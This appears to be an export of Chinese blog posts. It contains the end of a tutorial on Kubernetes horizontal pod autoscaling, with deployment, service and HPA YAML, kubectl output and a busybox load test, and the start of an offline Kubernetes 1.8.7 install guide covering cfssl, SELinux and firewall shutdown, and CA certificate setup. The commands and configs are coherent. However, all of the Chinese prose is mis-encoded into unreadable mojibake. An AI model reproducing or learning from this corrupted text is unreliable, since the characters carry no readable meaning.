Controllerä¼šé€šè¿‡è°ƒæ•´å‰¯æœ¬æ•°é‡ä½¿å¾—CPUä½¿ç”¨ç‡å°½é‡å‘æœŸæœ›å€¼é è¿‘ï¼Œè€Œä¸”ä¸æ˜¯å®Œå…¨ç›¸ç­‰ï¼å¦å¤–ï¼Œå®˜æ–¹è€ƒè™‘åˆ°è‡ªåŠ¨æ‰©å±•çš„å†³ç­–å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´æ‰ä¼šç”Ÿæ•ˆï¼šä¾‹å¦‚å½“podæ‰€éœ€è¦çš„CPUè´Ÿè·è¿‡å¤§ï¼Œä»è€Œåœ¨åˆ›å»ºä¸€ä¸ªæ–°podçš„è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿçš„CPUä½¿ç”¨é‡å¯èƒ½ä¼šåŒæ ·åœ¨æœ‰ä¸€ä¸ªæ”€å‡çš„è¿‡ç¨‹ã€‚æ‰€ä»¥ï¼Œåœ¨æ¯ä¸€æ¬¡ä½œå‡ºå†³ç­–åçš„ä¸€æ®µæ—¶é—´å†…ï¼Œå°†ä¸å†è¿›è¡Œæ‰©å±•å†³ç­–ã€‚å¯¹äºæ‰©å®¹è€Œè¨€ï¼Œè¿™ä¸ªæ—¶é—´æ®µä¸º3åˆ†é’Ÿï¼Œç¼©å®¹ä¸º5åˆ†é’Ÿ(å¯ä»¥é€šè¿‡--horizontal-pod-autoscaler-downscale-delay, --horizontal-pod-autoscaler-upscale-delayè¿›è¡Œè°ƒæ•´)ã€‚ HPA Controllerä¸­æœ‰ä¸€ä¸ªtoleranceï¼ˆå®¹å¿åŠ›ï¼‰çš„æ¦‚å¿µï¼Œå®ƒå…è®¸ä¸€å®šèŒƒå›´å†…çš„ä½¿ç”¨é‡çš„ä¸ç¨³å®šï¼Œç°åœ¨é»˜è®¤ä¸º0.1ï¼Œè¿™ä¹Ÿæ˜¯å‡ºäºç»´æŠ¤ç³»ç»Ÿç¨³å®šæ€§çš„è€ƒè™‘ã€‚ä¾‹å¦‚ï¼Œè®¾å®šHPAè°ƒåº¦ç­–ç•¥ä¸ºcpuä½¿ç”¨ç‡é«˜äº50%è§¦å‘æ‰©å®¹ï¼Œé‚£ä¹ˆåªæœ‰å½“ä½¿ç”¨ç‡å¤§äº55%æˆ–è€…å°äº45%æ‰ä¼šè§¦å‘ä¼¸ç¼©æ´»åŠ¨ï¼ŒHPAä¼šå°½åŠ›æŠŠPodçš„ä½¿ç”¨ç‡æ§åˆ¶åœ¨è¿™ä¸ªèŒƒå›´ä¹‹é—´ã€‚ å…·ä½“çš„æ¯æ¬¡æ‰©å®¹æˆ–è€…ç¼©å®¹çš„å¤šå°‘Podçš„ç®—æ³•ä¸º: Ceil(å‰é‡‡é›†åˆ°çš„ä½¿ç”¨ç‡ / ç”¨æˆ·è‡ªå®šä¹‰çš„ä½¿ç”¨ç‡) * Podæ•°é‡) æ¯æ¬¡æœ€å¤§æ‰©å®¹podæ•°é‡ä¸ä¼šè¶…è¿‡å½“å‰å‰¯æœ¬æ•°é‡çš„2å€ ä¾èµ–éƒ¨ç½²è¿™æ˜¯kuberntesæ•´ä¸ªç³»åˆ—çš„ç¬¬å››ç¯‡, è¯¥ç¯‡ä¾èµ–HeapsteræœåŠ¡æˆåŠŸå®‰è£…, å¦‚æœæœªå®‰è£…è¯·å‚è€ƒ: ä¼ä¸šçº§Dockeré•œåƒä»“åº“harborçš„éƒ¨ç½²å’Œä½¿ç”¨ kubernetes 1.8.7 ç¦»çº¿éƒ¨ç½²æ‰‹å†Œ(ä¸€) kubernetes 1.8.7 ç¦»çº¿éƒ¨ç½²æ‰‹å†Œ(äºŒ) å› ä¸ºåŸºäºHeapsterHPAä»…æ”¯æŒCPUä¸ºç»´åº¦çš„è‡ªåŠ¨ä¼¸ç¼©, å› æ­¤å†™äº†ä¸ªè®¡ç®—100ä½Ï€çš„HTTPæœåŠ¡, è¯¥ç¨‹åºå·²æ‰“åŒ…æ”¾äºç™¾åº¦ç½‘ç›˜ä¸‹, ä¸‹è½½hpa-test-app.tar å¯¼å…¥ç„¶åæ¨åˆ°è‡ªå·±ç§æœ‰ä»“åº“, ç­‰å¾…åç»­æµ‹è¯•(æ”¾å¿ƒè¯¥é•œåƒä»…æœ‰5Må¤šç‚¹) æœåŠ¡æµ‹è¯•åŸºäºä¸Šé¢æä¾›çš„hpa-test-appé•œåƒ, æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªhpa-test-app service, ç„¶åä¸ºè¯¥serviceæ·»åŠ HPAæœºåˆ¶ã€‚ æ³¨æ„äº‹é¡¹: å½“Podæ²¡æœ‰è®¾ç½®requestæ—¶ï¼ŒHPAä¸ä¼šå·¥ä½œã€‚ åˆ›å»ºDeploymentæ³¨æ„æ ¹æ®éœ€è¦ä¿®æ”¹è‡ªå·±çš„é•œåƒåœ°å€1234567891011121314151617181920212223242526272829303132333435363738cat &lt;&lt; EOF &gt; hpa-test-app-deploy.yamlapiVersion: extensions/v1beta1kind: Deploymentmetadata: name: hpa-test-app-deploy labels: app: hpa version: v0.0.1spec: replicas: 1 selector: matchLabels: name: hpa-test-app-deploy app: hpa version: v0.0.1 template: metadata: labels: name: hpa-test-app-deploy app: hpa version: v0.0.1 spec: containers: - name: hpa-test-app-deploy image: 192.168.204.15/kubernetes/hpa-test-app:v0.0.1 ports: - containerPort: 8080 name: http protocol: TCP resources: requests: cpu: 0.006 memory: 32Mi limits: cpu: 0.06 memory: 128MiEOFkubectl create -f hpa-test-app-deploy.yaml åˆ›å»ºservice12345678910111213141516171819cat &lt;&lt; EOF &gt; hpa-test-app-svc.yamlapiVersion: v1kind: Servicemetadata: name: hpa-test-app-svc labels: app: hpa version: v0.0.1spec: selector: name: hpa-test-app-deploy app: hpa version: v0.0.1 ports: - name: http port: 8080 protocol: TCPEOFkubectl create -f hpa-test-app-svc.yaml åˆ›å»ºHPA123456789101112131415161718cat &lt;&lt; EOF &gt; hpa-test-app-hpa.yamlapiVersion: autoscaling/v1kind: HorizontalPodAutoscalermetadata: name: hpa-test-app-hpa labels: app: hpa version: v0.0.1spec: scaleTargetRef: apiVersion: v1 kind: Deployment name: hpa-test-app-deploy minReplicas: 1 maxReplicas: 10 targetCPUUtilizationPercentage: 70EOFkubectl create -f hpa-test-app-hpa.yaml æ£€æŸ¥æœåŠ¡12345678[root@k8s-apiserver01 hpa-test]# kubectl get podsNAME READY STATUS RESTARTS AGEhpa-test-app-deploy-69dbc4cf84-5jvb6 1/1 Running 0 23s[root@k8s-apiserver01 hpa-test]# kubectl logs hpa-test-app-deploy-69dbc4cf84-5jvb62018/02/05 05:13:14 Server work at :8080 ...[root@k8s-apiserver01 hpa-test]# kubectl get hpaNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEhpa-test-app-hpa Deployment/hpa-test-app-deploy 0% / 70% 1 10 1 38s å¢å‹å’Œå‡å‹æµ‹è¯•é¦–å…ˆæˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªbusyboxçš„pod, ç”¨æ¥å¯¹hap-test-appæœåŠ¡è¿›è¡Œå‹åŠ›æµ‹è¯•1234567891011121314151617cat &lt;&lt; EOF &gt; pod-busybox.yamlapiVersion: v1kind: Podmetadata: name: busybox namespace: defaultspec: containers: - image: busybox command: - sleep - "3600" imagePullPolicy: IfNotPresent name: busybox restartPolicy: AlwaysEOFkubectl create -f pod-busybox.yaml ç„¶åæˆ‘ä»¬æ‰¾åˆ°hpa-test-appæœåŠ¡çš„clusterIP:123[root@k8s-apiserver01 apps]# kubectl get svc hpa-test-app-svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEhpa-test-app-svc ClusterIP 10.254.155.132 &lt;none&gt; 8080/TCP 1m åº”ç”¨æ‰©å¼ è¿›å…¥å®¹å™¨, æŒç»­è®¿é—®hpa-test-appçš„API(é»˜è®¤è®¡ç®—100ä½çš„Ï€, å¦‚æœæƒ³åŠ å¤§è®¡ç®—å¯ä»¥é€šè¿‡query string: ?length=1000æ¥å¢å¤§å•ä¸ªè¯·æ±‚å¯¹cpuçš„å‹åŠ›),12kubectl exec -it busybox /bin/sh/ # while true; do wget -q -O- 10.254.155.132:8080; done ç„¶åæˆ‘ä»¬æŒç»­å…³ç³»HPAçš„æ‰©å¼ 123456789[root@k8s-apiserver01 ~]# kubectl get hpaNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEhpa-test-app-hpa Deployment/hpa-test-app-deploy 345% / 70% 1 10 4 52m[root@k8s-apiserver01 ~]# kubectl get hpaNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEhpa-test-app-hpa Deployment/hpa-test-app-deploy 287% / 70% 1 10 8 56m[root@k8s-apiserver01 ~]# kubectl get hpaNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEhpa-test-app-hpa Deployment/hpa-test-app-deploy 0% / 70% 1 10 10 1h podæ•°é‡çš„å˜åŒ–æƒ…å†µ 1â€“&gt;2â€“&gt;4â€“&gt;8â€“&gt;10, æœ€ç»ˆè¾¾åˆ°æœ€å¤§çš„æ‰©å±•ä¸Šçº¿è€Œåœæ­¢. åº”ç”¨æ”¶ç¼©ä¸­æ–­å¯¹appçš„è®¿é—®, ä¼šå‘ç°å®¹å™¨åˆæ”¶ç¼©ä¸ºåŸæ¥çš„1ä¸ª:12345678910111213141516171819202122232425262728[root@k8s-apiserver01 ~]# kubectl get hpaNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEhpa-test-app-hpa Deployment/hpa-test-app-deploy 0% / 70% 1 10 1 1h[root@k8s-apiserver01 ~]# kubectl describe hpa hpa-test-app-hpaName: hpa-test-app-hpaNamespace: defaultLabels: app=hpa version=v0.0.1Annotations: &lt;none&gt;CreationTimestamp: Mon, 05 Feb 2018 00:47:31 -0500Reference: Deployment/hpa-test-app-deployMetrics: ( current / target ) resource cpu on pods (as a percentage of request): 0% (0) / 70%Min replicas: 1Max replicas: 10Conditions: Type Status Reason Message ---- ------ ------ ------- AbleToScale True ReadyForNewScale the last scale time was sufficiently old as to warrant a new scale ScalingActive True ValidMetricFound the HPA was able to succesfully calculate a replica count from cpu resource utilization (percentage of request) ScalingLimited True TooFewReplicas the desired replica count was less than the minimum replica countEvents: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedGetResourceMetric 46m (x57 over 1h) horizontal-pod-autoscaler missing request for cpu on container hpa-test-app-deploy in pod default/hpa-test-app-deploy-75b4fd6cf6-sf78p Normal SuccessfulRescale 41m (x2 over 1h) horizontal-pod-autoscaler New size: 4; reason: cpu resource utilization (percentage of request) above target Normal SuccessfulRescale 33m horizontal-pod-autoscaler New size: 10; reason: cpu resource utilization (percentage of request) above target Normal SuccessfulRescale 28m horizontal-pod-autoscaler New size: 1; reason: All metrics below target æ€»ç»“æœ¬æ–‡ä¸»è¦ä»‹ç»äº†HPAçš„ç›¸å…³åŸç†å’Œä½¿ç”¨æ–¹æ³•ï¼Œæ­¤åŠŸèƒ½å¯ä»¥èƒ½å¯¹æœåŠ¡çš„å®¹å™¨æ•°é‡åšè‡ªåŠ¨ä¼¸ç¼©ï¼Œå¯¹äºæœåŠ¡çš„ç¨³å®šæ€§æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æå‡ã€‚ä½†æ˜¯å½“å‰ç¨³å®šç‰ˆæœ¬ä¸­åªæœ‰cpuä½¿ç”¨ç‡è¿™ä¸€ä¸ªæŒ‡æ ‡ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å¼Šç«¯ã€‚ä½†æ˜¯kubernetesä¸­å…³äºHPAçš„æ¶å­å·²ç»æˆç†Ÿ, æœŸå¾…v2è¿›å…¥stable, éƒ½æ—¶å€™æ‰æ˜¯HPAæ‰èƒ½çˆ†å‘å®ƒæ­£åœ¨çš„é­…åŠ›ã€‚ å‚è€ƒ Kubernetes Horizontal Pod Autoscaler Kubernetes ä¸­Podå¼¹æ€§ä¼¸ç¼©è¯¦è§£ä¸ä½¿ç”¨]]></content>
      <categories>
        <category>è¿ç»´</category>
        <category>kubernetes</category>
      </categories>
      <tags>
        <tag>kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kubernetes 1.8.7 ç¦»çº¿éƒ¨ç½²æ‰‹å†Œ(ä¸€)]]></title>
    <url>%2F2018%2F01%2F18%2Fkubernetes-binary-install%2F</url>
    <content type="text"><![CDATA[æ­å»ºkubernetesé›†ç¾¤æœ€å¤§çš„éº»çƒ¦å…¶å®ä¸åœ¨äºå…¶å¤æ‚åº¦(ç›¸å¯¹Openstacké›†ç¾¤)è€Œåœ¨äºæœ‰GFW, æ‰€ä»¥ä¸ºäº†é¿å…å¢™å¸¦æ¥çš„éº»çƒ¦, ä¹Ÿä¸ºäº†åŠ æ·±å¯¹kubernetesçš„ç†è§£, è¿™é‡Œå°†ä½¿ç”¨çº¯æ‰‹å·¥ç¦»çº¿çš„æ–¹å¼è¿›è¡Œéƒ¨ç½²(ç›¸åº”çš„æ–‡ä»¶æˆ‘å·²ç»ä¸‹è½½åˆ°ç™¾åº¦äº‘ç›˜é‡Œé¢)ã€‚ ç¯å¢ƒä»‹ç»ä¸‹é¢Kubernetesé›†ç¾¤æ­å»ºéœ€è¦çš„ç‰ˆæœ¬ä¿¡æ¯: è½¯ä»¶ ç‰ˆæœ¬ OS CentOS Linux release 7.3.1611 (Core) Kubernetes 1.8.7 Docker 18.01.0-ce Etcd 3.2.7 æˆ‘ä»¬å°†åœ¨å››å°CentOSç³»ç»Ÿçš„ç‰©ç†æœºä¸Šéƒ¨ç½²ä¸€ä¸ª4ä¸ªèŠ‚ç‚¹çš„kubernetes1.8.7é›†ç¾¤(æˆªæ­¢å½“å‰2018.1æ˜¯æœ€æ–°ç‰ˆæœ¬): IP Role CPU Memory 192.168.204.3 master/node 2æ ¸ 4G 192.168.204.4 node 2æ ¸ 4G 192.168.204.6 node 2æ ¸ 4G 192.168.204.7 node 2æ ¸ 4G è¿™é‡ŒmasterèŠ‚ç‚¹åŒæ—¶å……å½“nodeèŠ‚ç‚¹, å› ä¸ºåé¢ä¸€äº›åœ¨éƒ¨ç½²calicoç½‘ç»œæ—¶é‡‡ç”¨çš„æ˜¯daemonSet, è¿™æ ·æ‰èƒ½ä¿è¯masterå’ŒnodeèŠ‚ç‚¹å†…éƒ¨ç½‘ç»œé€šç•…ã€‚ é•œåƒå‡†å¤‡åœ¨è¿›è¡Œé›†ç¾¤æ­å»ºæ—¶, ç”±äºå¾ˆå¤šé•œåƒéƒ½éœ€è¦ç¿»å¢™ä¸‹è½½, å› æ­¤è¯·å…ˆå‡†å¤‡ä¸€ä¸ªç§æœ‰ä»“åº“, å…³äºç§æœ‰ä»“åº“çš„æ­å»ºè¯·å‚è€ƒ: ä¼ä¸šçº§Dockeré•œåƒä»“åº“harborçš„éƒ¨ç½²å’Œä½¿ç”¨, å¦‚æœè¿˜æ²¡æ­å»ºçš„è¯·æ­å»ºç„¶åç»§ç»­. åœ¨åé¢çš„å®‰è£…è¿‡ç¨‹ä¸­éœ€è¦ä¾èµ–ä¸€ä¸ªåŸºç¡€é•œåƒ: pause, å®ƒæ˜¯æ ¹PODé•œåƒ, ç”¨äºç®¡ç†PODçš„ç½‘ç»œ, å­˜å‚¨ç­‰ä¸€äº›å…±äº«èµ„æº:1gcr.io/google_containers/pause-amd64:3.0 å¦‚æœè‡ªå·±èƒ½ç¿»å¢™å°±è‡ªå·±ä¸‹è½½åæ¨é€åˆ°è‡ªå·±çš„ç§æœ‰ä»“åº“, å¦‚æœè‡ªå·±ç¿»ä¸äº†å¢™, æˆ‘å·²å¸®å¿™ä¸‹è½½, è¯·åˆ°å›½å†…kubernetesé•œåƒtaråŒ…123docker load &lt; pause-amd64.tardocker tag gcr.io/google_containers/pause-amd64:3.0 &#123;PRIVATE_REGISTRIY_ADDR&#125;/&#123;PROJECT&#125;/pause-amd64:3.0docker push &#123;PRIVATE_REGISTRIY_ADDR&#125;/&#123;PROJECT&#125;/pause-amd64:3.0 é›†ç¾¤å‡†å¤‡åœ¨å¼€å§‹æ­å»ºé›†ç¾¤å‰éœ€è¦åšä¸€äº›åŸºç¡€å‡†å¤‡: åŒæ­¥é›†ç¾¤çš„æ—¶é—´ç†è®ºä¸Šsystemdç³»ç»Ÿéƒ½è‡ªå¸¦äº†æ—¶é—´åŒæ­¥å’Œç®¡ç†çš„å·¥å…·, ä½¿ç”¨timedatectlå‘½ä»¤ç¡®è®¤ä¸‹, ç¡®ä¿NTP synchronizedä¸ºyes: 123456789101112131415[root@k8s-apiserver ~]# timedatectl Local time: å…­ 2018-01-20 02:47:59 EST Universal time: å…­ 2018-01-20 07:47:59 UTC RTC time: å…­ 2018-01-20 07:47:59 Time zone: America/New_York (EST, -0500) NTP enabled: yesNTP synchronized: yes RTC in local TZ: no DST active: no Last DST change: DST ended at æ—¥ 2017-11-05 01:59:59 EDT æ—¥ 2017-11-05 01:00:00 EST Next DST change: DST begins (the clock jumps one hour forward) at æ—¥ 2018-03-11 01:59:59 EST æ—¥ 2018-03-11 03:00:00 EDT å…³é—­SELinuxSELinuxæ˜¯ç³»ç»Ÿä¸Šçš„æ²™ç›’æœºåˆ¶, ä¸ºäº†å°½å¿«æ­å»ºå‡ºé›†ç¾¤, å…ˆå…³é—­, å¦‚æœå¼ºè°ƒé«˜å®‰å…¨, å¯ä»¥ç­‰é›†ç¾¤æ­å»ºæˆåŠŸåå¼€å¯ 123456# ç¡®è®¤SELinuxçš„é…ç½®, å¦‚æœä¸æ˜¯disabled, è¯·è®¾ç½®æˆdisabled, ç„¶åä»å¯ç³»ç»Ÿ[root@k8s-apiserver ~]# cat /etc/selinux/config | grep ^SELINUX=SELINUX=disabled# æŸ¥çœ‹å½“å‰SELinuxæ˜¯å¦å·²ç»æˆåŠŸå…³é—­[root@k8s-apiserver ~]# getenforceDisabled å…³é—­é˜²ç«å¢™(æ­å»ºæˆåŠŸåå¯ä»¥æ…¢æ…¢å¼€å¯)systemdç³»ç»Ÿä¸€èˆ¬éƒ½é‡‡ç”¨firewalldä½œä¸ºé˜²ç«å¢™, åŒç†å¦‚æœæ²¡å…³é—­ å…ˆå…³é—­ 1234567[root@k8s-apiserver ~]# systemctl is-enabled firewallddisabled# å¦‚æœæœªå…³é—­è¯·æ‰§è¡Œ[root@k8s-apiserver ~]# systemctl stop firewalld[root@k8s-apiserver ~]# systemctl disable firewalld[root@k8s-apiserver ~]# systemctl is-enabled firewallddisabled é›†ç¾¤éƒ¨ç½²æ¥ä¸‹æ¥è¿›å…¥é›†ç¾¤çš„éƒ¨ç½²é˜¶æ®µ, éƒ¨ç½²åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªé˜¶æ®µ: CAå’Œè¯ä¹¦å‡†å¤‡ éƒ¨ç½²kuberneteså®¢æˆ·ç«¯å·¥å…·kubectl nodeèŠ‚ç‚¹çš„TLSè¯ä¹¦å¼•å¯¼(TLS Bootstrap)é…ç½®å‡†å¤‡ éƒ¨ç½²ETCD éƒ¨ç½²masterèŠ‚ç‚¹ éƒ¨ç½²nodeèŠ‚ç‚¹ é›†ç¾¤æµ‹è¯• åœ¨è¿›å…¥éƒ¨ç½²ä¹‹å‰, å…ˆçœ‹çœ‹kubernetesç»„ä»¶çš„æ¶æ„: Kubernetesä¸»è¦ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒç»„ä»¶ç»„æˆï¼š etcdä¿å­˜äº†æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€ï¼› apiserveræä¾›äº†èµ„æºæ“ä½œçš„å”¯ä¸€å…¥å£ï¼Œå¹¶æä¾›è®¤è¯ã€æˆæƒã€è®¿é—®æ§åˆ¶ã€APIæ³¨å†Œå’Œå‘ç°ç­‰æœºåˆ¶ï¼› controller managerè´Ÿè´£ç»´æŠ¤é›†ç¾¤çš„çŠ¶æ€ï¼Œæ¯”å¦‚æ•…éšœæ£€æµ‹ã€è‡ªåŠ¨æ‰©å±•ã€æ»šåŠ¨æ›´æ–°ç­‰ï¼› schedulerè´Ÿè´£èµ„æºçš„è°ƒåº¦ï¼ŒæŒ‰ç…§é¢„å®šçš„è°ƒåº¦ç­–ç•¥å°†Podè°ƒåº¦åˆ°ç›¸åº”çš„æœºå™¨ä¸Šï¼› kubeletè´Ÿè´£ç»´æŒå®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¹Ÿè´Ÿè´£Volumeï¼ˆCVIï¼‰å’Œç½‘ç»œï¼ˆCNIï¼‰çš„ç®¡ç†ï¼› Container runtimeè´Ÿè´£é•œåƒç®¡ç†ä»¥åŠPodå’Œå®¹å™¨çš„çœŸæ­£è¿è¡Œï¼ˆCRIï¼‰ï¼› kube-proxyè´Ÿè´£ä¸ºServiceæä¾›clusterå†…éƒ¨çš„æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡ï¼› CAå’Œè¯ä¹¦å‡†å¤‡kubernetesæ˜¯ä¸€å¥—åˆ†å¸ƒå¼ç³»ç»Ÿ, ç³»ç»Ÿçš„å„ç»„ä»¶å‡ä½¿ç”¨TLSæ¥è¿›è¡Œèº«ä»½çš„åŒå‘ç¡®è®¤å’Œé€šä¿¡åŠ å¯†, æœ¬æ–‡æ¡£ä½¿ç”¨CloudFlareæä¾›çš„PKIå·¥å…·é›† cfsslæ¥ç”ŸæˆCertificate Authority (CA)å’Œç®¡ç†è¯ä¹¦(opensslå·²å¯ä»¥, ä½†æ˜¯ä½ éœ€è¦ä¸€æ­¥ä¸€æ­¥çš„å¡«å†™). æˆ‘ä»¬éœ€è¦ä¸ºæ¯ä¸€ä¸ªkubernetesçš„ç»„ä»¶ç”Ÿæˆè¯ä¹¦, æ€»ç»“èµ·æ¥å¦‚ä¸‹: kubectl: ç”¨æˆ·çš„CLIå·¥å…·, éœ€è¦ä¸ºç”¨æˆ·ç”Ÿæˆè®¿é—®çš„è¯ä¹¦, è¿™é‡Œéœ€è¦ä¸ºadminç”¨æˆ·é¢å‘1å¼ è¯ä¹¦ master: apiserver, controller manager, scheduler, etcd è¿™4ä¸ªæœåŠ¡éƒ½åœ¨masterèŠ‚ç‚¹ä¸Š, å› æ­¤ä¸ºä»–ä»¬é¢å‘1å¼ è¯ä¹¦ node: kubelet, kube-proxy ç”±äºkubeletçš„è¯ä¹¦æ˜¯åŠ¨æ€é¢å‘çš„(TLS Bootstra), å› æ­¤è¿™é‡Œä»…éœ€è¦ä¸ºkube-proxyé¢å‘1å¼ è¯ä¹¦ å®‰è£…cfsslå·¥å…·1234567891011wget https://pkg.cfssl.org/R1.2/cfssl_linux-amd64chmod +x cfssl_linux-amd64mv cfssl_linux-amd64 /usr/local/bin/cfsslwget https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64chmod +x cfssljson_linux-amd64mv cfssljson_linux-amd64 /usr/local/bin/cfssljsonwget https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64chmod +x cfssl-certinfo_linux-amd64mv cfssl-certinfo_linux-amd64 /usr/local/bin/cfssl-certinfo åˆ›å»ºCAé¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç›®å½•pki, åé¢çš„æ“ä½œéƒ½åœ¨è¿™ä¸ªç›®å½•é‡Œé¢è¿›è¡Œ1mkdir pki &amp;&amp; cd pki é¦–å…ˆåˆ›å»ºCAçš„é…ç½®æ–‡ä»¶: ca-config.json123456789101112131415161718192021# è¿‡æœŸæ—¶é—´è®¾ç½®æˆäº† 87600hcat &gt; ca-config.json &lt;&lt;EOF&#123; "signing": &#123; "default": &#123; "expiry": "87600h" &#125;, "profiles": &#123; "kubernetes": &#123; "usages": [ "signing", "key encipherment", "server auth", "client auth" ], "expiry": "87600h" &#125; &#125; &#125;&#125;EOF å…³äºCAé…ç½®æ–‡ä»¶é‡Œé¢çš„å‚æ•°è¯´æ˜: ca-config.jsonï¼šå¯ä»¥å®šä¹‰å¤šä¸ª profilesï¼Œåˆ†åˆ«æŒ‡å®šä¸åŒçš„è¿‡æœŸæ—¶é—´ã€ä½¿ç”¨åœºæ™¯ç­‰å‚æ•°ï¼›åç»­åœ¨ç­¾åè¯ä¹¦æ—¶ä½¿ç”¨æŸä¸ª profileï¼› signingï¼šè¡¨ç¤ºè¯¥è¯ä¹¦å¯ç”¨äºç­¾åå…¶å®ƒè¯ä¹¦ï¼›ç”Ÿæˆçš„ ca.pem è¯ä¹¦ä¸­ CA=TRUEï¼› server authï¼šè¡¨ç¤ºclientå¯ä»¥ç”¨è¯¥ CA å¯¹serveræä¾›çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼› client authï¼šè¡¨ç¤ºserverå¯ä»¥ç”¨è¯¥CAå¯¹clientæä¾›çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼› åˆ›å»ºCAè¯ä¹¦ç­¾åè¯·æ±‚123456789101112131415161718cat &gt; ca-csr.json &lt;&lt;EOF&#123; "CN": "kubernetes", "key": &#123; "algo": "rsa", "size": 2048 &#125;, "names": [ &#123; "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" &#125; ]&#125;EOF å…³äºè¯ä¹¦ç­¾åè¯·æ±‚çš„å‚æ•°è¯´æ˜: â€œCNâ€ï¼šCommon Nameï¼Œkube-apiserver ä»è¯ä¹¦ä¸­æå–è¯¥å­—æ®µä½œä¸ºè¯·æ±‚çš„ç”¨æˆ·å (User Name)ï¼›æµè§ˆå™¨ä½¿ç”¨è¯¥å­—æ®µéªŒè¯ç½‘ç«™æ˜¯å¦åˆæ³•ï¼› â€œOâ€ï¼šOrganizationï¼Œkube-apiserver ä»è¯ä¹¦ä¸­æå–è¯¥å­—æ®µä½œä¸ºè¯·æ±‚ç”¨æˆ·æ‰€å±çš„ç»„ (Group)ï¼› ç”ŸæˆCAè¯ä¹¦å’Œç§é’¥123$ cfssl gencert -initca ca-csr.json | cfssljson -bare ca$ ls ca*ca-config.json ca.csr ca-csr.json ca-key.pem ca.pem adminç”¨æˆ·è¯ä¹¦åç»­kube-apiserverä½¿ç”¨RBACå¯¹å®¢æˆ·ç«¯(å¦‚ kubeletã€kube-proxyã€Pod)è¯·æ±‚è¿›è¡Œæˆæƒï¼›kube-apiserver é¢„å®šä¹‰äº†ä¸€äº›RBACä½¿ç”¨çš„RoleBindings, å¦‚cluster-adminå°†Group system:mastersä¸Role cluster-admin ç»‘å®šï¼Œè¯¥Roleæˆäºˆäº†è°ƒç”¨kube-apiserverçš„æ‰€æœ‰APIçš„æƒé™, æ„æ€æ˜¯å‡¡æ˜¯system:masters Groupçš„useréƒ½æ‹¥æœ‰cluster-adminçš„è§’è‰²ã€‚ å› æ­¤æˆ‘ä»¬åœ¨ä½¿ç”¨kubectlå‘½ä»¤æ—¶å€™ï¼Œæ‰æ‹¥æœ‰æ•´ä¸ªé›†ç¾¤çš„ç®¡ç†æƒé™(åé¢éƒ¨ç½²äº†å®¢æˆ·ç«¯å·¥å…·æ–¹å¯æŸ¥çœ‹)ï¼›å› æ­¤adminç”¨æˆ·è¯ä¹¦ç”³è¯·çš„æ ¸å¿ƒæ˜¯æŒ‡å®šGroup: Group system:masters, è¿™æ ·è¯¥ç”¨æˆ·å°±æœ‰è®¿é—®APIServerçš„æ‰€æœ‰æƒé™çš„.ç­¾åè¯·æ±‚å‚æ•°å¦‚ä¸‹:12345678910111213141516171819cat &gt; admin-csr.json &lt;&lt;EOF&#123; "CN": "admin", "hosts": [], "key": &#123; "algo": "rsa", "size": 2048 &#125;, "names": [ &#123; "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "system:masters", "OU": "System" &#125; ]&#125;EOF ç”Ÿæˆç­¾åè¯ä¹¦:123$ cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes admin-csr.json | cfssljson -bare admin$ ls admin*admin.csr admin-csr.json admin-key.pem admin.pem masteræœåŠ¡è¯ä¹¦12345678910111213141516171819202122232425262728cat &gt; kubernetes-csr.json &lt;&lt;EOF&#123; "CN": "kubernetes", "hosts": [ "127.0.0.1", "192.168.204.3", "10.254.0.1", "kubernetes", "kubernetes.default", "kubernetes.default.svc", "kubernetes.default.svc.cluster", "kubernetes.default.svc.cluster.local" ], "key": &#123; "algo": "rsa", "size": 2048 &#125;, "names": [ &#123; "C": "CN", "ST": "BeiJing", "L": "BeiJing", "O": "k8s", "OU": "System" &#125; ]&#125;EOF å‚æ•°è¯´æ˜: hosts: å¦‚æœhostså­—æ®µä¸ä¸ºç©ºåˆ™éœ€è¦æŒ‡å®šæˆæƒä½¿ç”¨è¯¥è¯ä¹¦çš„IPæˆ–åŸŸååˆ—è¡¨ï¼Œç”±äºè¯¥è¯ä¹¦åç»­è¢«etcdé›†ç¾¤å’Œkubernetes masteré›†ç¾¤ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸Šé¢åˆ†åˆ«æŒ‡å®šäº†etcdé›†ç¾¤ã€kubernetes masteré›†ç¾¤çš„ä¸»æœºIPå’ŒkubernetesæœåŠ¡çš„æœåŠ¡IP(ä¸€èˆ¬æ˜¯ kube-apiserveræŒ‡å®šçš„ service-cluster-ip-range ç½‘æ®µçš„ç¬¬ä¸€ä¸ªIPï¼Œå¦‚ 10.254.0.1)ã€‚ ç”Ÿæˆç­¾åè¯ä¹¦:123$ cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kubernetes-csr.json | cfssljson -bare kubernetes$ ls kubernetes*kubernetes.csr kubernetes-csr.json kubernetes-key.pem kubernetes.pem 